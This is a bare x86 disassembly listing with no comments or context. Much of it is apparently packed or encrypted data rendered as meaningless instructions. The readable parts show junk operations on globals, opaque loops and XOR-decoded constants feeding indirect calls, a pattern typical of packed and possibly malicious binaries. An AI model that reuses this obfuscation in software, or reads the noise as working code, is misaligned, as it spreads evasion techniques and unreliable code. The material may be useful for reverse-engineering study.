  40526b:	jmp    0x405478
  405270:	sar    DWORD PTR [edx+ebp*4],cl
  405273:	push   ebp
  405274:	mov    cl,0x71
  405276:	icebp  
  405277:	mov    eax,0xd68c6305
  40527c:	push   cs
  40527d:	xor    BYTE PTR [edx-0x2d],0xc6
  405281:	sub    al,0x7e
  405283:	jle    0x4052f3
  405285:	jg     0x405305
  405287:	jle    0x405211
  405289:	push   0xab1ca0ef
  40528e:	jg     0x4052e7
  405290:	in     al,0xfb
  405292:	mov    ebp,0xa9742325
  405297:	pop    edi
  405298:	into   
  405299:	into   
  40529a:	sub    eax,0xcfc7bd64
  40529f:	jns    0x405222
  4052a1:	or     ah,BYTE PTR [esp+ebp*2+0x62]
  4052a5:	push   ds
  4052a6:	and    al,0x1b
  4052a8:	dec    eax
  4052a9:	cmp    DWORD PTR [esi+0x60],ebp
  4052ac:	cli    
  4052ad:	mov    ch,0x50
  4052af:	jle    0x405278
  4052b1:	cwde   
  4052b2:	loope  0x4052a6
  4052b4:	inc    eax
  4052b5:	sub    eax,0x8828173f
  4052ba:	dec    edi
  4052bb:	inc    edi
  4052bc:	adc    eax,0x41345ba2
  4052c1:	jecxz  0x405280
  4052c3:	ja     0x4052ef
  4052c5:	or     BYTE PTR [esi],dh
  4052c7:	sub    BYTE PTR [edi+0x1e],al
  4052ca:	mov    esi,0x976eea3a
  4052cf:	pop    ebx
  4052d0:	(bad)  
  4052d1:	sbb    BYTE PTR [edx+0x9],bl
  4052d4:	scas   eax,DWORD PTR es:[edi]
  4052d5:	dec    ebp
  4052d6:	dec    ebp
  4052d7:	outs   dx,BYTE PTR ds:[esi]
  4052d8:	push   0x17ed7913
  4052dd:	aaa    
  4052de:	xchg   ebp,eax
  4052df:	sbb    eax,0x2e517c3f
  4052e4:	aam    0x4c
  4052e6:	(bad)  
  4052e7:	addr16 popa 
  4052e9:	adc    al,0x96
  4052eb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4052ec:	mov    esp,0x64f627b9
  4052f1:	mov    ebp,0xe60eded8
  4052f6:	inc    ebx
  4052f7:	sub    esi,0x7a
  4052fa:	mov    al,0x4a
  4052fc:	outs   dx,BYTE PTR ds:[esi]
  4052fd:	and    cl,ch
  4052ff:	jnp    0x4052b3
  405301:	jl     0x4052a7
  405303:	and    ebx,DWORD PTR [ebx]
  405305:	jb     0x4052c9
  405307:	cmp    ebp,edi
  405309:	push   eax
  40530a:	imul   ebp,DWORD PTR [ecx-0x6e8c39b0],0xffffff9d
  405311:	pop    ss
  405312:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405313:	leave  
  405314:	mov    cl,cl
  405316:	mov    ds:0x92b1eaba,eax
  40531b:	pop    eax
  40531c:	iret   
  40531d:	mov    DWORD PTR [ecx+ecx*1-0x3c],esp
  405321:	std    
  405322:	adc    ebp,ecx
  405324:	pop    edi
  405325:	fnstsw WORD PTR [esi]
  405327:	push   edx
  405328:	xchg   edx,esp
  40532a:	cmc    
  40532b:	jl     0x4052b7
  40532d:	sbb    DWORD PTR [ecx-0x4f],ebp
  405330:	fldcw  WORD PTR [ebx-0x1f760d63]
  405336:	dec    ebp
  405337:	mov    ebp,0x398daeba
  40533c:	dec    ebp
  40533d:	mov    es,ebp
  40533f:	sbb    eax,0x2af648b8
  405344:	pop    eax
  405345:	mov    esp,0x2ff62e9a
  40534a:	test   bh,0xe6
  40534d:	cmp    eax,0x5b9987e3
  405352:	or     eax,0xd1bc603f
  405357:	stos   BYTE PTR es:[edi],al
  405358:	imul   ecx,DWORD PTR [edx+ebp*1],0x78
  40535c:	enter  0x699f,0x3d
  405360:	in     al,dx
  405361:	jecxz  0x405392
  405363:	sbb    dh,al
  405365:	sbb    ebp,esi
  405367:	imul   ebp,DWORD PTR [edx-0x68d38991],0xfffffffa
  40536e:	jge    0x40532d
  405370:	xor    al,0xe6
  405372:	xlat   BYTE PTR ds:[ebx]
  405373:	jb     0x4053a5
  405375:	ret    0x48
  405378:	loop   0x4053f9
  40537a:	adc    eax,0x2bb7ba4a
  40537f:	push   ecx
  405380:	sar    DWORD PTR [edi+0xe],1
  405383:	pusha  
  405384:	add    al,0x6e
  405386:	adc    DWORD PTR [edi-0x1523330a],edi
  40538c:	xchg   DWORD PTR [edi],edi
  40538e:	jnp    0x405390
  405390:	adc    bh,BYTE PTR [ecx+0x30ca2091]
  405396:	push   eax
  405397:	in     eax,0x2e
  405399:	das    
  40539a:	xor    DWORD PTR [edi+0x35172229],ebx
  4053a0:	mov    ecx,0x9fa6cd1
  4053a5:	test   DWORD PTR [edx-0x4c9e68b],ebx
  4053ab:	jbe    0x40532e
  4053ad:	inc    ebx
  4053ae:	fs rcr bl,cl
  4053b1:	pop    edi
  4053b2:	or     bl,BYTE PTR [ebp-0x6ed5d67a]
  4053b8:	cmp    eax,0x6a0a962f
  4053bd:	push   esi
  4053be:	sbb    ah,BYTE PTR [ebx]
  4053c0:	je     0x40535f
  4053c2:	sub    al,0xbd
  4053c4:	push   ss
  4053c5:	and    DWORD PTR [esi],ebp
  4053c7:	(bad)  
  4053c8:	xchg   edi,eax
  4053c9:	sub    BYTE PTR [edi+0x7d1429b8],bh
  4053cf:	adc    DWORD PTR fs:[esi-0x1e],ebp
  4053d3:	cwde   
  4053d4:	jmp    0x405381
  4053d6:	sub    eax,0x253fd595
  4053db:	inc    eax
  4053dc:	fcomp  DWORD PTR [ecx+ecx*4-0x62]
  4053e0:	fsubr  QWORD PTR [esp+edx*8+0x48]
  4053e4:	frstor [ecx-0x5c]
  4053e7:	fstp   DWORD PTR [ebp-0x68]
  4053ea:	jae    0x4053b9
  4053ec:	sbb    dl,ch
  4053ee:	inc    BYTE PTR [edi]
  4053f0:	mov    esp,ecx
  4053f2:	mov    ebx,DWORD PTR [ebx]
  4053f4:	div    bh
  4053f6:	fisttp WORD PTR [ebx+0x12e313ff]
  4053fc:	out    dx,al
  4053fd:	hlt    
  4053fe:	cmp    BYTE PTR fs:[ecx+edi*1+0x66],dh
  405403:	sbb    al,0x1a
  405405:	jnp    0x40540f
  405407:	out    dx,eax
  405408:	retf   0xf366
  40540b:	in     eax,0xac
  40540d:	stos   BYTE PTR es:[edi],al
  40540e:	loope  0x405400
  405410:	lds    edi,FWORD PTR [edi]
  405412:	xchg   ebp,eax
  405413:	imul   ebx,eax,0x2a6fe7af
  405419:	lahf   
  40541a:	shr    BYTE PTR [esi],1
  40541c:	xchg   edi,eax
  40541d:	mov    ds:0x33de70ac,al
  405422:	or     al,0xff
  405424:	jg     0x4053e6
  405426:	fwait
  405427:	sbb    al,0x6c
  405429:	lds    esp,FWORD PTR [ecx-0x6]
  40542c:	adc    DWORD PTR [edi-0x6b599bbe],edx
  405432:	(bad)  
  405433:	call   0x1370:0xf3751730
  40543a:	jmp    0x592a:0xb977d28f
  405441:	lea    ebx,[edx+0x4dac3c8b]
  405447:	in     eax,0x37
  405449:	out    dx,eax
  40544a:	scas   al,BYTE PTR es:[edi]
  40544b:	xchg   ebx,eax
  40544c:	mov    dl,0x6e
  40544e:	adc    al,0x15
  405450:	push   ebx
  405451:	cmp    al,BYTE PTR [ebx]
  405453:	xor    cl,BYTE PTR [ecx]
  405455:	movsx  esi,bl
  405458:	rcr    BYTE PTR [esi-0x4c],cl
  40545b:	or     eax,0x431f79e3
  405460:	dec    ebp
  405461:	ja     0x4053e7
  405463:	test   eax,0xb22f2cf3
  405468:	mov    ebp,DWORD PTR [eax+0x4f]
  40546b:	aas    
  40546c:	jp     0x4054af
  40546e:	and    dh,BYTE PTR [edi-0x65]
  405471:	add    DWORD PTR [edx],eax
  405473:	aad    0xcc
  405475:	xlat   BYTE PTR ds:[ebx]
  405476:	mov    WORD PTR [ecx-0x74f7bd77],ss
  40547c:	inc    ebp
  40547d:	sbb    al,0x8b
  40547f:	push   ebp
  405480:	adc    BYTE PTR [ecx+0x458b0c42],cl
  405486:	and    BYTE PTR [ebx+0x42891055],cl
  40548c:	adc    BYTE PTR [ebx+0x14458bc0],cl
  405492:	test   eax,eax
  405494:	mov    eax,DWORD PTR [ebp+0x8]
  405497:	jne    0x4054a0
  40549d:	mov    eax,DWORD PTR [ebp+0xc]
  4054a0:	xor    eax,ecx
  4054a2:	add    eax,0x32729b
  4054a7:	leave  
  4054a8:	ret    0x1c
  4054ab:	push   ebp
  4054ac:	mov    ebp,esp
  4054ae:	sub    esp,0x78
  4054b1:	mov    eax,ds:0x4121a8
  4054b6:	mov    DWORD PTR [ebp-0x10],eax
  4054b9:	mov    eax,ds:0x4122b4
  4054be:	mov    DWORD PTR [ebp-0x30],eax
  4054c1:	mov    DWORD PTR [ebp-0xc],0xf89c8531
  4054c8:	mov    DWORD PTR [ebp-0x14],0xf89c8532
  4054cf:	mov    eax,ds:0x4304df
  4054d4:	sbb    DWORD PTR ds:0x430445,eax
  4054da:	mov    eax,DWORD PTR [ebp-0xc]
  4054dd:	xor    DWORD PTR ds:0x430471,0x5a75
  4054e7:	push   ebx
  4054e8:	push   esi
  4054e9:	push   edi
  4054ea:	or     DWORD PTR ds:0x430455,0x19e9
  4054f4:	mov    esi,0x7510854
  4054f9:	xor    eax,esi
  4054fb:	mov    edi,0x32729b
  405500:	add    eax,edi
  405502:	or     DWORD PTR ds:0x4304e3,0x57a7
  40550c:	mov    DWORD PTR [ebp-0x20],eax
  40550f:	mov    DWORD PTR [ebp-0x28],0xf89cb531
  405516:	and    DWORD PTR ds:0x430455,0x0
  405520:	jmp    0x405530
  405525:	mov    eax,ds:0x430455
  40552a:	inc    eax
  40552b:	mov    ds:0x430455,eax
  405530:	cmp    DWORD PTR ds:0x430455,0x1d
  405537:	jae    0x4057cb
  40553d:	cmp    DWORD PTR ds:0x430455,0x4
  405544:	jne    0x405555
  40554a:	push   0x35c7
  40554f:	call   DWORD PTR ds:0x42ec17
  405555:	cmp    DWORD PTR ds:0x430455,0x3
  40555c:	jne    0x40556d
  405562:	mov    eax,ds:0x430455
  405567:	inc    eax
  405568:	mov    ds:0x430455,eax
  40556d:	jmp    0x405525
  405572:	mov    DWORD PTR ds:0x430471,0x14
  40557c:	cmp    DWORD PTR ds:0x430471,0x0
  405583:	je     0x4057cb
  405589:	cmp    DWORD PTR ds:0x430471,0x2
  405590:	jne    0x4055a2
  405596:	push   DWORD PTR [ebp-0x20]
  405599:	push   DWORD PTR [ebp-0x20]
  40559c:	call   DWORD PTR ds:0x42eaa3
  4055a2:	cmp    DWORD PTR ds:0x430471,0x3
  4055a9:	jne    0x4055bd
  4055af:	xor    eax,eax
  4055b1:	xor    eax,DWORD PTR ds:0x430471
  4055b7:	dec    eax
  4055b8:	mov    ds:0x430471,eax
  4055bd:	mov    eax,ds:0x430471
  4055c2:	dec    eax
  4055c3:	mov    ds:0x430471,eax
  4055c8:	jmp    0x40557c
  4055cd:	or     DWORD PTR ds:0x42edd3,edi
  4055d3:	jmp    0x4057cb
  4055d8:	jl     0x405580
  4055da:	inc    bl
  4055dc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4055dd:	jecxz  0x405620
  4055df:	popa   
  4055e0:	xor    eax,0xeea2c60a
  4055e5:	sbb    eax,0x2a36c038
  4055ea:	jle    0x40566a
  4055ec:	push   ebp
  4055ed:	jg     0x40566d
  4055ef:	jle    0x405578
  4055f1:	ins    DWORD PTR es:[edi],dx
  4055f2:	stos   BYTE PTR es:[edi],al
  4055f3:	popa   
  4055f4:	lods   al,BYTE PTR ds:[esi]
  4055f5:	repz inc esi
  4055f7:	push   ebx
  4055f8:	rcl    BYTE PTR [eax],1
  4055fa:	ss out dx,al
  4055fc:	or     al,0xfa
  4055fe:	xchg   BYTE PTR [ebx+0x4f],ch
  405601:	xchg   edx,eax
  405602:	mov    al,0xfc
  405604:	xchg   edx,eax
  405605:	dec    esp
  405606:	dec    esp
  405607:	or     DWORD PTR [ecx],edi
  405609:	xchg   BYTE PTR [ebx+ecx*2+0x756254cd],cl
  405610:	mov    DWORD PTR [ecx-0x1c],ebp
  405613:	jmp    0x4055b2
  405615:	or     ebp,DWORD PTR [eax-0x1f]
  405618:	ds mov bh,0x1a
  40561b:	pop    esi
  40561c:	sub    ecx,edx
  40561e:	ds mov eax,0x96f07482
  405624:	jae    0x4055ec
  405626:	std    
  405627:	dec    esp
  405628:	out    dx,al
  405629:	xor    DWORD PTR [eax-0x6],ebp
  40562c:	and    ah,dl
  40562e:	or     edi,esi
  405630:	lock adc DWORD PTR [ebp+0x4c4a754e],ecx
  405637:	(bad)  
  40563a:	mov    ebp,0xc8d4b4a1
  40563f:	sar    BYTE PTR [ecx+0x15fb77be],0xf0
  405646:	mov    bh,BYTE PTR [ebp-0x73]
  405649:	mov    esp,0x8804bf46
  40564e:	sbb    al,0xeb
  405650:	sbb    dl,al
  405652:	mov    bh,bh
  405654:	xchg   edi,eax
  405655:	mov    BYTE PTR [eax-0x75],ch
  405658:	add    ch,BYTE PTR [eax-0x6d]
  40565b:	jae    0x4056b9
  40565d:	shr    eax,cl
  40565f:	fild   WORD PTR [ebp-0x21]
  405662:	sbb    ecx,0xffffffa2
  405665:	lahf   
  405666:	mov    ch,0xf9
  405668:	add    al,0xd5
  40566a:	bnd jmp 0xb1596264
  405670:	mov    edi,0x9a719ac0
  405675:	mov    cl,0xb2
  405677:	xlat   BYTE PTR ds:[ebx]
  405678:	or     ch,ch
  40567a:	outs   dx,BYTE PTR ds:[esi]
  40567b:	inc    ecx
  40567c:	cmc    
  40567d:	es loop 0x405672
  405680:	retf   
  405681:	and    BYTE PTR [esi+0xd],dh
  405684:	rcr    ebx,cl
  405686:	rcr    DWORD PTR [ecx+0x55ace14f],cl
  40568c:	sub    esp,DWORD PTR [edi-0xb143b9a]
  405692:	(bad)  
  405693:	hlt    
  405694:	neg    DWORD PTR [eax]
  405696:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405697:	xor    dl,BYTE PTR [ebx]
  405699:	mov    al,0xb5
  40569b:	xchg   ecx,eax
  40569c:	sbb    DWORD PTR ds:0x1bc535dd,esp
  4056a2:	push   esp
  4056a3:	cmp    DWORD PTR [esi-0x5564537],esp
  4056a9:	push   cs
  4056aa:	sub    dh,cl
  4056ac:	lods   al,BYTE PTR ds:[esi]
  4056ad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4056ae:	push   esi
  4056af:	adc    eax,0x8edaa1c7
  4056b4:	ds xchg ebx,eax
  4056b6:	cmp    eax,DWORD PTR [edi-0x64]
  4056b9:	out    0x63,al
  4056bb:	cmp    al,0x9b
  4056bd:	cmp    BYTE PTR [ebx+0xf],bh
  4056c0:	push   eax
  4056c1:	dec    esp
  4056c2:	lds    edx,FWORD PTR [esi+0x3d]
  4056c5:	add    ch,BYTE PTR [ecx-0x5a87e0c6]
  4056cb:	das    
  4056cc:	loop   0x4056a0
  4056ce:	pop    ebx
  4056cf:	xor    al,0xb2
  4056d1:	cwde   
  4056d2:	fsubrp st(6),st
  4056d4:	cld    
  4056d5:	xchg   ebp,eax
  4056d6:	cmp    bl,BYTE PTR [ebp-0x776f7a7a]
  4056dc:	cs pop ebp
  4056de:	xchg   esi,eax
  4056df:	sbb    ecx,DWORD PTR [edi+eiz*1]
  4056e2:	out    0xb0,eax
  4056e4:	cdq    
  4056e5:	sbb    BYTE PTR [ebx+0x6b],al
  4056e8:	dec    ebx
  4056e9:	xchg   cl,cl
  4056eb:	xor    DWORD PTR [ecx],edi
  4056ed:	xor    esp,DWORD PTR ss:[esi-0x37815b20]
  4056f4:	pop    ebx
  4056f5:	and    DWORD PTR [edi-0x7d060204],esp
  4056fb:	push   eax
  4056fc:	pop    edi
  4056fd:	shr    BYTE PTR [esi],1
  4056ff:	dec    DWORD PTR [eax+0x7a37732f]
  405705:	jecxz  0x40577b
  405707:	add    esp,DWORD PTR [esp+ebp*2+0x45]
  40570b:	jge    0x405746
  40570d:	ret    0x9735
  405710:	xacquire xchg DWORD PTR [esi+0x0],ebp
  405714:	lahf   
  405715:	dec    edi
  405716:	mov    esp,0xa09b1d15
  40571b:	cld    
  40571c:	loop   0x405766
  40571e:	scas   eax,DWORD PTR es:[edi]
  40571f:	mov    dh,0x39
  405721:	jnp    0x40573f
  405723:	mov    eax,0xf44abaf2
  405728:	std    
  405729:	xor    dl,dh
  40572b:	mov    edx,0x27fb1210
  405730:	in     al,dx
  405731:	test   al,0x2c
  405733:	mov    esp,DWORD PTR [edi+0x1273f144]
  405739:	cmp    al,0xff
  40573b:	push   es
  40573c:	les    ecx,FWORD PTR [ecx-0x75]
  40573f:	test   eax,0x8875b2dd
  405744:	push   eax
  405745:	or     DWORD PTR [esi-0x3fb73b05],esp
  40574b:	sar    BYTE PTR [esi+0x100f49ca],0xc
  405752:	ins    DWORD PTR es:[edi],dx
  405753:	aad    0x1f
  405755:	pop    es
  405756:	test   al,0x8b
  405758:	dec    eax
  405759:	mul    BYTE PTR [esp+eiz*8-0x7d8422c8]
  405760:	cld    
  405761:	xchg   ecx,eax
  405762:	xchg   edi,eax
  405763:	sbb    al,0x2e
  405765:	cmp    DWORD PTR [eax+0x93f4df4],ecx
  40576b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40576c:	call   0x6e24d034
  405771:	push   edi
  405772:	push   ds
  405773:	add    DWORD PTR [eax],esp
  405775:	mov    ah,dh
  405777:	and    eax,DWORD PTR [esi]
  405779:	das    
  40577a:	cmp    al,0xe7
  40577c:	lock inc ebp
  40577e:	call   0xaf9b44f5
  405783:	sti    
  405784:	inc    edi
  405785:	repz fwait
  405787:	mov    al,0x14
  405789:	and    al,0x6d
  40578b:	mov    BYTE PTR ds:0x6cbcb027,dh
  405791:	fidiv  DWORD PTR [ecx-0x7f]
  405794:	int3   
  405795:	inc    esi
  405796:	out    dx,eax
  405797:	pop    edx
  405798:	push   edi
  405799:	and    BYTE PTR [ebx-0x30],bh
  40579c:	or     ecx,DWORD PTR [eax-0x4c749fe8]
  4057a2:	and    ch,BYTE PTR [edx]
  4057a4:	cmp    ebp,DWORD PTR [edx+0x6f]
  4057a7:	mov    ah,BYTE PTR [edi-0x542bcb4a]
  4057ad:	jecxz  0x40575e
  4057af:	mov    al,ds:0xa56445fa
  4057b4:	push   edi
  4057b5:	int    0xfc
  4057b7:	xor    eax,0xe4658d89
  4057bc:	fsub   QWORD PTR [ecx+0x11]
  4057bf:	pop    esp
  4057c0:	dec    ebp
  4057c1:	and    ebx,edi
  4057c3:	addr16 jo 0x40581b
  4057c6:	out    0xba,eax
  4057c8:	mov    edx,0x45c70ad4
  4057cd:	int3   
  4057ce:	xor    DWORD PTR ds:0x5c7f89f,eax
  4057d4:	fucomi st,st(5)
  4057d6:	inc    edx
  4057d7:	add    BYTE PTR [edx],bl
  4057d9:	add    BYTE PTR [eax],al
  4057db:	add    BYTE PTR [ebx+0x42eddb3d],al
  4057e1:	add    BYTE PTR [eax],al
  4057e3:	je     0x405811
  4057e9:	cmp    DWORD PTR ds:0x42eddb,0x29
  4057f0:	jne    0x4057ff
  4057f6:	push   DWORD PTR [ebp-0x24]
  4057f9:	call   DWORD PTR ds:0x42e9d7
  4057ff:	mov    eax,ds:0x42eddb
  405804:	dec    eax
  405805:	mov    ds:0x42eddb,eax
  40580a:	jmp    0x4057dc
  40580f:	neg    eax
  405811:	mov    DWORD PTR [ebp-0x2c],0xf89c85f1
  405818:	mov    eax,ds:0x42e7c8
  40581d:	or     DWORD PTR ds:0x430445,eax
  405823:	mov    DWORD PTR [ebp-0x24],0xf89c85d1
  40582a:	mov    eax,DWORD PTR [ebp-0xc]
  40582d:	and    DWORD PTR ds:0x430439,0x7e31
  405837:	xor    eax,esi
  405839:	add    eax,edi
  40583b:	mov    DWORD PTR [ebp-0x18],eax
  40583e:	sbb    DWORD PTR ds:0x42e7d4,0x48a8
  405848:	mov    DWORD PTR [ebp-0x1c],0xf89c853e
  40584f:	sub    eax,DWORD PTR ds:0x42edef
  405855:	mov    BYTE PTR [ebp-0x1],0x67
  405859:	mov    DWORD PTR ds:0x42eddb,0x1c
  405863:	cmp    DWORD PTR ds:0x42eddb,0x0
  40586a:	je     0x4058ae
  405870:	cmp    DWORD PTR ds:0x42eddb,0xe
  405877:	jne    0x405886
  40587d:	push   DWORD PTR [ebp-0x18]
  405880:	call   DWORD PTR ds:0x42e9db
  405886:	cmp    DWORD PTR ds:0x42eddb,0xf
  40588d:	jne    0x40589e
  405893:	mov    eax,ds:0x42eddb
  405898:	dec    eax
  405899:	mov    ds:0x42eddb,eax
  40589e:	mov    eax,ds:0x42eddb
  4058a3:	dec    eax
  4058a4:	mov    ds:0x42eddb,eax
  4058a9:	jmp    0x405863
  4058ae:	mov    eax,DWORD PTR [ebp-0xc]
  4058b1:	or     DWORD PTR ds:0x430441,0x42edd3
  4058bb:	xor    eax,esi
  4058bd:	add    eax,edi
  4058bf:	mov    DWORD PTR [ebp-0x18],eax
  4058c2:	mov    eax,DWORD PTR [ebp-0x24]
  4058c5:	sbb    DWORD PTR ds:0x430435,0x42e7c4
  4058cf:	xor    eax,esi
  4058d1:	sbb    DWORD PTR ds:0x4304d3,0xd15
  4058db:	add    eax,edi
  4058dd:	inc    DWORD PTR ds:0x43045d
  4058e3:	push   eax
  4058e4:	xor    eax,eax
  4058e6:	xor    eax,DWORD PTR ds:0x43043d
  4058ec:	xor    DWORD PTR ds:0x430461,eax
  4058f2:	mov    eax,DWORD PTR [ebp-0x28]
  4058f5:	sub    DWORD PTR ds:0x430451,0x42edef
  4058ff:	xor    eax,esi
  405901:	or     DWORD PTR ds:0x430441,0x42e7c8
  40590b:	add    eax,edi
  40590d:	push   eax
  40590e:	or     eax,DWORD PTR ds:0x430441
  405914:	mov    eax,DWORD PTR [ebp-0x1c]
  405917:	or     DWORD PTR ds:0x42edd3,0x39ed
  405921:	xor    eax,esi
  405923:	not    DWORD PTR ds:0x42edeb
  405929:	add    eax,edi
  40592b:	adc    DWORD PTR ds:0x430469,0x4304eb
  405935:	push   eax
  405936:	sbb    DWORD PTR ds:0x430469,0x42e7c8
  405940:	lea    eax,[ebp-0x78]
  405943:	push   eax
  405944:	dec    DWORD PTR ds:0x4304d3
  40594a:	push   DWORD PTR [ebp-0xc]
  40594d:	sub    DWORD PTR ds:0x4304d3,0x42e7d4
  405957:	push   DWORD PTR [ebp-0x14]
  40595a:	and    DWORD PTR ds:0x43043d,0x42eddb
  405964:	call   0x4046ad
  405969:	test   eax,eax
  40596b:	je     0x405da5
  405971:	lea    eax,[ebp-0x78]
  405974:	sbb    DWORD PTR ds:0x42edcf,0x42edeb
  40597e:	push   eax
  40597f:	movzx  eax,BYTE PTR ds:0x430455
  405986:	sbb    eax,DWORD PTR ds:0x43046d
  40598c:	mov    ds:0x430455,eax
  405991:	jmp    0x405b89
  405996:	xor    DWORD PTR [ecx+0x5c],esi
  405999:	sbb    eax,0x7171315c
  40599e:	repnz fistp WORD PTR [esi-0x48]
  4059a2:	out    0x56,eax
  4059a4:	push   edx
  4059a5:	ins    BYTE PTR es:[edi],dx
  4059a6:	or     eax,0x557e7e28
  4059ab:	jg     0x405a2b
  4059ad:	jle    0x4059f0
  4059af:	int    0x81
  4059b1:	inc    eax
  4059b2:	inc    edx
  4059b3:	sbb    BYTE PTR [edi],cl
  4059b5:	sbb    al,0x4f
  4059b7:	ins    BYTE PTR es:[edi],dx
  4059b8:	xchg   ebp,eax
  4059b9:	inc    esp
  4059ba:	sbb    al,0x4a
  4059bc:	sbb    ch,dh
  4059be:	mov    edi,DWORD PTR [esi-0x35]
  4059c1:	xor    al,0x8b
  4059c3:	push   edi
  4059c4:	pop    esi
  4059c5:	xor    al,BYTE PTR [esi]
  4059c7:	leave  
  4059c8:	(bad)  
  4059ca:	rcl    DWORD PTR [edi-0x69560235],1
  4059d0:	mov    BYTE PTR [esi+0x30f4a760],0x24
  4059d7:	ret    0x651a
  4059da:	imul   esp,DWORD PTR [ebp+ebx*8+0x72],0xd4af15a7
  4059e2:	and    ebp,DWORD PTR [edi-0x5e]
  4059e5:	lods   eax,DWORD PTR ds:[esi]
  4059e6:	aaa    
  4059e7:	adc    BYTE PTR [esi+0x55],0xac
  4059eb:	retf   0xffd
  4059ee:	jle    0x4059d8
  4059f0:	xor    al,0x1f
  4059f2:	push   ebp
  4059f3:	stc    
  4059f4:	add    esp,edi
  4059f6:	lods   eax,DWORD PTR ds:[esi]
  4059f7:	mov    edi,0xbb06bc38
  4059fc:	fcomp  QWORD PTR [ecx+0x410c0d82]
  405a02:	adc    ebx,edx
  405a04:	push   0x4f
  405a06:	mov    dh,BYTE PTR [esi]
  405a08:	stos   DWORD PTR es:[edi],eax
  405a09:	cld    
  405a0a:	(bad)  
  405a0c:	scas   al,BYTE PTR es:[edi]
  405a0d:	mov    ebx,0x6f72a6f6
  405a12:	shr    edi,1
  405a14:	daa    
  405a15:	call   0x1706b72f
  405a1a:	pop    edx
  405a1b:	cmc    
  405a1c:	sbb    edx,DWORD PTR ds:0x3ffaf9ee
  405a22:	gs mov dh,0xfa
  405a25:	mov    eax,0x7efcb987
  405a2a:	daa    
  405a2b:	push   0x1b2f1e54
  405a30:	out    0xd9,al
  405a32:	pop    esp
  405a33:	icebp  
  405a34:	adc    eax,0xe21ca54e
  405a39:	add    ebx,DWORD PTR [ebx-0x7d5a7194]
  405a3f:	push   edi
  405a40:	inc    edi
  405a41:	jecxz  0x405a52
  405a43:	outs   dx,BYTE PTR ds:[esi]
  405a44:	in     eax,0x5a
  405a46:	adc    eax,0x2eea2eb6
  405a4b:	sbb    ebx,DWORD PTR [esi]
  405a4d:	out    dx,al
  405a4e:	mov    al,ss:0xc93e1a54
  405a54:	sbb    al,0x66
  405a56:	fdiv   st,st(5)
  405a58:	mov    cl,0xae
  405a5a:	(bad)  
  405a5c:	mov    al,0xf9
  405a5e:	xor    dl,BYTE PTR [esi+0x33eb4f50]
  405a64:	fdiv   DWORD PTR [ebx]
  405a66:	mov    dh,0x48
  405a68:	pop    eax
  405a69:	sbb    eax,0x34e0451e
  405a6e:	mov    dl,0x1
  405a70:	call   0x7b51:0x2689957e
  405a77:	xor    dh,al
  405a79:	in     eax,0xc5
  405a7b:	sub    DWORD PTR ds:0xdfa243ca,esp
  405a81:	sahf   
  405a82:	push   0x61
  405a84:	lock push edi
  405a86:	in     eax,0x1c
  405a88:	(bad)  
  405a89:	jp     0x405aab
  405a8b:	pop    ebx
  405a8c:	shl    DWORD PTR [bp+di-0x70],cl
  405a90:	in     eax,0x34
  405a92:	mov    gs:0x62bc8c1,eax
  405a98:	xchg   ebx,eax
  405a99:	sub    al,0x4a
  405a9b:	test   al,dh
  405a9d:	pop    ss
  405a9e:	popaw  
  405aa0:	mov    ds:0xb84e3774,eax
  405aa5:	push   ds
  405aa6:	or     al,0xa4
  405aa8:	inc    edi
  405aa9:	imul   BYTE PTR [ecx-0x6e]
  405aac:	mov    eax,0xa7893905
  405ab1:	test   al,0x6
  405ab3:	xlat   BYTE PTR ds:[ebx]
  405ab4:	retf   
  405ab5:	das    
  405ab6:	mov    edx,esp
  405ab8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405ab9:	inc    esi
  405aba:	nop
  405abb:	push   cs
  405abc:	add    DWORD PTR [ebp-0x316d4e48],eax
  405ac2:	sbb    DWORD PTR ss:[edx-0x4788708],ebp
  405ac9:	out    dx,al
  405aca:	push   esp
  405acb:	mov    ds:0x6887d587,eax
  405ad0:	pop    ecx
  405ad1:	mov    edx,0xfb1aaff
  405ad6:	outs   dx,DWORD PTR ds:[esi]
  405ad7:	adc    eax,0x37c37e5e
  405adc:	jmp    0x92e7:0xb5c3e0e2
  405ae3:	push   ebp
  405ae4:	pop    ebx
  405ae5:	cwde   
  405ae6:	fdivr  QWORD PTR [edi]
  405ae8:	xor    esi,DWORD PTR [edx]
  405aea:	push   esp
  405aeb:	mov    BYTE PTR [esi],bh
  405aed:	fadd   QWORD PTR [ecx]
  405aef:	sbb    ch,0xde
  405af2:	repz mov al,0x67
  405af5:	add    al,0x11
  405af7:	test   al,0xbe
  405af9:	popf   
  405afa:	icebp  
  405afb:	loopne 0x405b0e
  405afd:	sub    esp,DWORD PTR [ecx]
  405aff:	sub    eax,0xcbed64ad
  405b04:	loope  0x405b24
  405b06:	jmp    0xc26844a2
  405b0b:	dec    ebp
  405b0c:	sbb    bl,BYTE PTR [esi+0x6a]
  405b0f:	or     al,0xe1
  405b11:	sti    
  405b12:	test   al,0x94
  405b14:	das    
  405b15:	(bad)  
  405b16:	sbb    DWORD PTR [ecx+edi*4+0x3f],ecx
  405b1a:	jbe    0x405acd
  405b1c:	pushf  
  405b1d:	(bad)  
  405b1e:	call   0x30e5:0xd304c1e
  405b25:	or     bh,BYTE PTR [ebx-0x48dcbce7]
  405b2b:	fild   DWORD PTR [edi]
  405b2d:	out    dx,eax
  405b2e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405b2f:	cmc    
  405b30:	jecxz  0x405bb1
  405b32:	cmp    eax,0xf0f81727
  405b37:	push   ds
  405b38:	inc    edx
  405b39:	scas   eax,DWORD PTR es:[edi]
  405b3a:	and    dh,BYTE PTR [esi-0x624e89b8]
  405b40:	ins    DWORD PTR es:[edi],dx
  405b41:	(bad)  
  405b42:	popf   
  405b43:	push   ss
  405b44:	cmc    
  405b45:	jmp    0xbc65:0x1b6a71d
  405b4c:	cld    
  405b4d:	mov    eax,0xe34f1411
  405b52:	jle    0x405b8c
  405b54:	xchg   edx,eax
  405b55:	sub    DWORD PTR [ebx],ecx
  405b57:	or     BYTE PTR [ecx+edx*4-0x50],dh
  405b5b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405b5c:	mov    al,ds:0x23b443a2
